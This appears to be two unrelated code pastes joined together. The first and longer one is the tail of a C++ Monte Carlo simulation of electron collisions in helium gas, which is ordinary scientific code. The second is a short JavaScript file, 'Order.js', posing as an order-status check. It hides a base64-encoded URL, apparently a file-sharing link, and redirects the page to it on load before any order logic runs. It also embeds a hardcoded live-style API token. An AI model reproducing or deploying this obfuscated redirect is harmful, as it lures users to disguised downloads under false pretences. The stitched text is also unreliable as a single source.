            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;
 
        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }
 
    std::cout << ""initial nu_max: "" <<nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////    

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995


    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    
 
 
        //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
        int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;   

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index


        for (int i = 0; i < Ne_collided; ++i) {
            int j = i + std::uniform_int_distribution<int>(0, n_e - i - 1)(gen);
            std::swap(electron_indices[i], electron_indices[j]);
        }

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        double energy_exc = 0.0; // calculating excitation losses each timestep
        double energy_sup = 0.0; // calculating superelastic gains each timestep
        double energy_Efield = 0.0; // calculating field gains/losses each timestep


        // std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""\n"";

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- /// -- first half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; // dividing by q to get eV             
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz)*charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------//   


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double dens_neutrals = (N_He/Volume);
            double dens_exc_1 = (exc_1.size()/Volume);
            double dens_exc_2 = (exc_2.size()/Volume);
            double speed = sqrt_charge_mass*sqrt(e.energy);

            int bin_energy = static_cast<int>(e.energy / bin_width);
            double nu_elastic = dens_neutrals * elastic_vec[bin_energy] * speed;
            double nu_inelastic1 = dens_neutrals * inelastic1_vec[bin_energy] * speed;
            double nu_superelastic1 = dens_exc_1 * superelastic1_vec[bin_energy] * speed;
            double nu_inelastic2 = dens_neutrals * inelastic2_vec[bin_energy] * speed;
            double nu_superelastic2 = dens_exc_2 * superelastic2_vec[bin_energy] * speed;

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {

                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron
 
                // randomize particles each collision
 
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;
 
 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                if (cos_khi >= 1)
                    cos_khi = 1.0 - dopant;
                if (cos_khi <= -1)
                    cos_khi = -1.0 + dopant;
                                     
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities  
 
                double delta_E = mass_ratio*(1.0 - cos_khi)*E_0;
                if (e.energy < delta_E) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }     
                else {                           
                    e.energy = E_0 - delta_E;
                }
                
                double speed = sqrt_charge_mass*sqrt(e.energy);
 
                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;              
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }        

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;

                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;
                energy_sup += thresh1;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;
                energy_sup += thresh2;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }


        /// -- electrin field heating along E-Z axis begin--- /// -- second half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; //dividing by q to get eV
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz) * charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        int decay_counter = 0;

        // // Iterate backwards to safely remove elements
        // for (int i = exc_2.size() - 1; i >= 0; --i) {
        //     if (dis(gen) < dt / tau_singlet) {
        //         // Swap with last element and pop (like your superelastic code)
        //         std::swap(exc_2[i], exc_2.back());
        //         exc_2.pop_back();
        //         N_He++;
        //         decay_counter++;
        //     }
        // }


        t_elapsed += dt; // Advance time
 
        // Recalculate nu_max periodically (e.g., every 100 steps)
        static int recalc_counter = 0;
        if (++recalc_counter >= 10000) {
            
            recalc_counter = 0;
 
            // Recalculate nu_max with CURRENT densities
            nu_max = 0.0;
            for (int i = 0; i < N; i++) {
                double energy = Emin + (i + 0.5) * bin_width;
                
                // Get current densities
                double n_ground = N_He / Volume;
                double n_excited1 = exc_1.size() / Volume;
                double n_excited2 = exc_2.size() / Volume;
                
                // Total collision frequency for this energy bin
                double sigma_total = 
                    elastic_vec[i] * n_ground +
                    inelastic1_vec[i] * n_ground +
                    inelastic2_vec[i] * n_ground +
                    superelastic1_vec[i] * n_excited1 +
                    superelastic2_vec[i] * n_excited2;
 
                double speed = sqrt_charge_mass*sqrt(energy);
                double nu_temp = sigma_total * speed;
                
                if (nu_temp > nu_max) nu_max = nu_temp;
            }


 
            // Update dt based on new nu_max
            dt = 0.1 / nu_max;        
        }   

        // calculating mean energy 
        if (static_cast<int>(t_elapsed/dt)%print_interval == 0) {
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t_elapsed << "" "" << mean_energy << ""\n"";            
            file_temp << t_elapsed << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";
            std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";
            std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << "" "" << ""decay counter: "" << decay_counter <<   ""\n"";
            file16 << t_elapsed << "" "" << energy_Efield/n_e << "" "" << energy_sup/n_e << ""\n"";
        }        

    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";
        std::cout << ""Final nu max: "" << nu_max << ""\n"";

    // ----- final electron energies distribution ends


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();
    file16.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
y4mmbmC4,Order.js,WantingTrae,JavaScript,Saturday 19th of April 2025 12:48:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91178/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
